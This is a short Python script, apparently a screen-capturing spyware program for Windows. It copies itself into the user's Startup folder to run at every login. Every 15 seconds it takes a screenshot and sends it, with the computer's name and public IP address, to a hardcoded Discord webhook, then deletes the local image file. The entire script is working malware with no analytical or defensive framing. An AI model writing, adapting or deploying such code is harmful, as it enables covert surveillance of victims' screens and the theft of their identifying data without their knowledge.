from datetime import datetime
from dhooks import Webhook, File
from requests import get
from time import sleep
from pyautogui import screenshot
from os import environ, remove
from os.path import isdir
from shutil import copy
from sys import executable

dst = environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

if not isdir(dst + executable):
    copy(executable, dst)

while(True):
    #SAVE IMAGE
    filename = datetime.now().strftime("%d.%m. - %H sat %M minut %S sekund")
    filename1 = filename + ".png"
    myScreenshot = screenshot()
    myScreenshot.save(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
    
    ############################
    ip = get('https://api.ipify.org').content.decode('utf8')
    pcName = environ['COMPUTERNAME']
    currentTime = datetime.now().strftime("%d.%m. - %H:%M:%S")
    hook = Webhook("https://discord.com/api/webhooks/902185555272532008/z42slGeHQlx4WInZo9gJC4OgxRX4nUs4j1JyXQg4n6HCQamFujVvsF_DX-y7ALtZ7OLh")
    cameraImage = File(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
    hook.send("```\nPC NAME: "+ pcName +"\nIP: "+ format(ip)+"\n"+ currentTime + "```", file=cameraImage)
    remove(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
    sleep(15)#VREME NA KOJE SLIKA
